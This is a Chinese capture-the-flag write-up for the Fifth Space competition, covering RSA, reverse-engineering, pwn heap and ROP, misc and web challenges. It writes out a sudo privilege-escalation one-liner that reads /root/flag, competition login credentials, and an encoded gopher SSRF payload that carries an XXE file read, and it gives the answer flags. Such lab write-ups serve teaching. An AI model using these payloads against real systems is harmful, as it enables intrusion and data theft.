第五空间6月24日比赛的部分WP.

## 目录

![image.php?url=0PiEuOzWVy](https://i1.go2yd.com/image.php?url=0PiEuOzWVy)

## crypto

### rosb

rsa共模攻击，网上找了个板子改了改

![image.php?url=0PiEuOHuJJ](https://i1.go2yd.com/image.php?url=0PiEuOHuJJ)

![image.php?url=0PiEuOj1VT](https://i1.go2yd.com/image.php?url=0PiEuOj1VT)

## re

### nop

main函数里存在三个需要nop的反调试的函数(共五处），nop后的逻辑是：输入数字，然后通过eax一直加(大约是反调试jump的次数)+0xCCCCCCCC，最后的值用于在函数`sub_8048691`中patch
`eax`和`eax+1`的值为0x90。因此正确的patch才能跳转到right处，由于中间eax+1有点多不想数b，所以大概算了个值（考虑一下32位溢出），然后前后遍历了一小段数字，得到flag为`99357990`

### rev

本意是一个rop导向的逆向题，但写trace太麻烦了，所以试了下angr的模板，正好可以用，注意一下输入参数为argv1

![image.php?url=0PiEuOw34X](https://i1.go2yd.com/image.php?url=0PiEuOw34X)

## pwn

### twice

第一次溢出一个字节用于泄露`canary`和栈地址，第二次溢出`0x20`字节，其中除了填写`canary`外，`rbp`位置存放字符串起始栈地址`-8`，返回地址填`leave
ret`，这样就可以多出`88`字节的ROP。ROP主体为`puts`泄露`libc`地址、`read`往`bss`（也可以继续往栈上）写入`system("/bin/sh\x00")`的另一段`ROP`，最后栈转移，正好``88`字节。

![image.php?url=0PiEuOtG3F](https://i1.go2yd.com/image.php?url=0PiEuOtG3F)

![image.php?url=0PiEuOAgbg](https://i1.go2yd.com/image.php?url=0PiEuOAgbg)

![image.php?url=0PiEuOgWV7](https://i1.go2yd.com/image.php?url=0PiEuOgWV7)

运行实例：

# print(p.pid)

p.interactive

### pwnme

因为除了`off-one-null-byte`外更严重的是有任意长度堆溢出的操作，一开始想的是使用overlapping，但因为环境一直搭不起来拿不到`unsortedbin`的偏移，又看到没开`PIE`并且`GOT`表可写，所以最后换了`unlink`来做。`unlink`后泄露`free`地址再填入`system`地址一把梭。

![image.php?url=0PiEuOSoHv](https://i1.go2yd.com/image.php?url=0PiEuOSoHv)

![image.php?url=0PiEuO243A](https://i1.go2yd.com/image.php?url=0PiEuO243A)

![image.php?url=0PiEuO2YoT](https://i1.go2yd.com/image.php?url=0PiEuO2YoT)

运行实例：![image.php?url=0PiEuOMucS](https://i1.go2yd.com/image.php?url=0PiEuOMucS)

### of

只给源码的`pwn`，先把`tcache`填满使得后续堆块释放到`fastbin`，然后利用`scanf`触发`malloc_consolidate`释放到`unsortedbin`泄露`libc`地址，最后便是常规改`__free_hook`的操作。这里比较奇怪的是泄露的`unsortedbin`的地址多了`0x100`，第一次见这种操作。

![image.php?url=0PiEuOtXNO](https://i1.go2yd.com/image.php?url=0PiEuOtXNO)

![image.php?url=0PiEuOMLdA](https://i1.go2yd.com/image.php?url=0PiEuOMLdA)

![image.php?url=0PiEuOgkyM](https://i1.go2yd.com/image.php?url=0PiEuOgkyM)

## misc

### 签到

flag{https://5space.360.cn}

### 麒麟系统

提权root权限，访问/root/flag，获取内容

user：kylin-user pwd：FifthSpace360

118.26.139.133：22IP地址更换118.26.139.133：22

sudo配置不当可以以root权限执行

sudo -u#-1 cat /root/flag

### loop

tar和zip循环解压，用下面的脚本跑五六次差不多能拿到flag的文件

`import os``for i in range(100):`` os.system('tar -xvf tarfile')``
os.system('unzip -o zipfile')``# flag{a4944cc1-0e50-44d3-9d85-6c52a3387330}`

philosophy

一开始打算当作逆向来做，但使用`DIE`看时发现资源区段显示加壳，很可疑。

![image.php?url=0PiEuOoT8S](https://i1.go2yd.com/image.php?url=0PiEuOoT8S)

查看资源区段，果然有`FL4G`字样。

![image.php?url=0PiEuOVv8z](https://i1.go2yd.com/image.php?url=0PiEuOVv8z)

因此直接用`Resource Hacker`查看，发现非常明显的`PNG`结构特征。

提出来改一下`PNG`头前四个字节即可看到`FLAG`。

![image.php?url=0PiEuOibTf](https://i1.go2yd.com/image.php?url=0PiEuOibTf)

### run

很大的`run.exe`，`win10`桌面显示是个`word`，想起来`word`本来也是压缩包，解压了一下拿到一个`word`和一个小的`run.exe`，跑了一下发现出来一个`tif`文件

![image.php?url=0PiEuOcGOK](https://i1.go2yd.com/image.php?url=0PiEuOcGOK)

改了后缀以后用ps打开，黑色块可以移动，移开后得到

![image.php?url=0PiEuOlP1h](https://i1.go2yd.com/image.php?url=0PiEuOlP1h)

而tif文件的最后有run.exe加上的`run->njCp1HJBPLVTxcMhUHDPwE7mPW`，因此试了下有无`flag{}``，有无`run->`，最后正确的是

![image.php?url=0PiEuOGrqY](https://i1.go2yd.com/image.php?url=0PiEuOGrqY)

## web

### hate-php

没有过滤 ~直接用取反，unicode字符用url编码

phpinfo验证

![image.php?url=0PiEuONSEb](https://i1.go2yd.com/image.php?url=0PiEuONSEb)

### do you know

index.php的限制条件可以随意填写，只要符合条件就可以了

![image.php?url=0PiEuOoOiB](https://i1.go2yd.com/image.php?url=0PiEuOoOiB)

foreach循环中会遍历$_GET并把遍历最后的值赋给url，此处存在SSRF可以访问 xxe.php

xxe.php处存在XXE漏洞，但是需要绕过过滤，不过这个过滤只过滤一次，所以直接双写就可以了

![image.php?url=0PiEuO391y](https://i1.go2yd.com/image.php?url=0PiEuO391y)

问题在于xxe需要post访问，我们现在有SSRF所以使用gopher可以发出post包

XXE payload

![image.php?url=0PiEuOQzG0](https://i1.go2yd.com/image.php?url=0PiEuOQzG0)

用 gopher 发送

a1=b&a2=b&c=gopher://127.0.0.1:80/_%2550%254f%2553%2554%2520%252f%2578%2578%2565%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2532%2531%2536%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%250d%250a%2564%2561%2574%2561%253d%2525%2533%2543%2525%2532%2531%2544%254f%2543%2554%2559%2550%2545%252b%2566%256f%256f%252b%2525%2535%2542%2525%2530%2544%2525%2530%2541%2525%2533%2543%2525%2532%2531%2545%254c%2545%254d%2545%254e%2554%252b%2566%256f%256f%252b%2541%254e%2559%252b%2525%2533%2545%2525%2530%2544%2525%2530%2541%2525%2533%2543%2525%2532%2531%2545%254e%2554%2549%2554%2559%252b%2578%252b%2553%2559%2553%2554%2545%254d%252b%2525%2532%2532%2570%2568%2570%2525%2533%2541%2525%2532%2546%2525%2532%2546%2566%2569%256c%2574%2565%2572%2525%2532%2546%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565%2525%2532%2546%2572%2565%2573%256f%2575%2572%2563%2565%2525%2533%2544%252e%2525%2532%2546%2566%256c%2566%256c%2561%2567%2561%2567%252e%2570%2568%2570%2525%2532%2532%2525%2533%2545%2525%2535%2544%2525%2533%2545%2525%2530%2544%2525%2530%2541%2525%2533%2543%2575%2573%2565%2572%2525%2533%2545%2525%2532%2536%2578%2525%2533%2542%2525%2533%2543%2525%2532%2546%2575%2573%2565%2572%2525%2533%2545%252b%252b%252b%252b%252b%252b%252b%252b

得到flag ，base 解码一下

![image.php?url=0PiEuOlOVL](https://i1.go2yd.com/image.php?url=0PiEuOlOVL)

美团外卖

源码www.zip审计发现，daochu.php存在sql语句，并且与login比起来，没有过滤

![image.php?url=0PiEuOAwPp](https://i1.go2yd.com/image.php?url=0PiEuOAwPp)

发现给了路径，但是暂时还不知道什么用

继续审计

发现有ueditor和webuploader，需要结合hint中的路径访问

在webuploader里有preview.php可以上传图片

![image.php?url=0PiEuOCno3](https://i1.go2yd.com/image.php?url=0PiEuOCno3)

payload

![image.php?url=0PiEuObNnL](https://i1.go2yd.com/image.php?url=0PiEuObNnL)

![image.php?url=0PiEuORSN5](https://i1.go2yd.com/image.php?url=0PiEuORSN5)

![image.php?url=0PiEuOgxMd](https://i1.go2yd.com/image.php?url=0PiEuOgxMd)

这里？？？啥意思get file。。。我的shell呢？

![image.php?url=0PiEuOWCXW](https://i1.go2yd.com/image.php?url=0PiEuOWCXW)

。。。。。天才出题人

flag{g879aee87y8501c1deab01c7b54f2fa9}

### laravel(unsolved)

寻找POP链

![image.php?url=0PiEuOMaIK](https://i1.go2yd.com/image.php?url=0PiEuOMaIK)

![image.php?url=0PiEuOfa5S](https://i1.go2yd.com/image.php?url=0PiEuOfa5S)

flag{90569859b0164266ef04461bbc1d5cc5}

### zzm blog(unsolved)

CVE-2019-12086配合 JDBC autoDeserialize 绕过黑名单

![image.php?url=0PiEuOjkLE](https://i1.go2yd.com/image.php?url=0PiEuOjkLE)

# 本文系合天智汇原创，转载请注明出处。

  

